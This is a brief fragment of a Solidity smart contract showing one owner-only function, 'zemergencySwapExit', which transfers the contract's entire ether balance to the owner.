    function zemergencySwapExit() public onlyOwner returns(bool)
    {
        require(msg.sender == owner());
        msg.sender.transfer(address(this).balance);
        return true;
    }
    


}